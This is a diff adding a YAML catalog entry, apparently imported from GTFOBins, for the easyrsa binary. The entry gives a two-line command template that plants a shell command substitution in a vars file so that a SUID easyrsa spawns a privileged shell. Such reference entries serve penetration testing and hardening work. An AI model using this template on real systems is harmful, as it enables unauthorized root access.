@@ -1,0 +1,28 @@
+id: gtfobins/easyrsa/shell/suid
+type: binary
+platform: linux
+name: easyrsa
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo ''set_var X "$(/bin/sh 1>&0)"'' >/path/to/temp-file
+
+    easyrsa --vars=/path/to/temp-file'
+  comment: This command might not be in the `PATH`, it could be found in, `/usr/share/easy-rsa/easyrsa`.
+    The shell is spawn twice.
+references:
+- https://gtfobins.github.io/gtfobins/easyrsa/
+tags:
+- linux
+- unix
+- gtfobins
